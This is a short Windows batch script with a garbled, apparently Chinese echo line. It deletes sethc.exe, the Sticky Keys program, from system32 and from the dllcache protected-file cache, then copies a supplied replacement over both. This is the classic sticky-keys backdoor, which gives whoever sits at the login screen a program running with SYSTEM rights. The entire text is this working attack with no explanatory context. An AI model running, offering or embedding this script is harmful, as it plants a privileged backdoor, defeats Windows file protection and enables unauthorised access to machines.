@echo off
echo �滻sethc.exe
del /q %systemroot%\system32\sethc.exe
del /q %systemroot%\system32\dllcache\sethc.exe
copy .\sethc.exe %systemroot%\system32\sethc.exe
copy .\sethc.exe %systemroot%\system32\dllcache\sethc.exe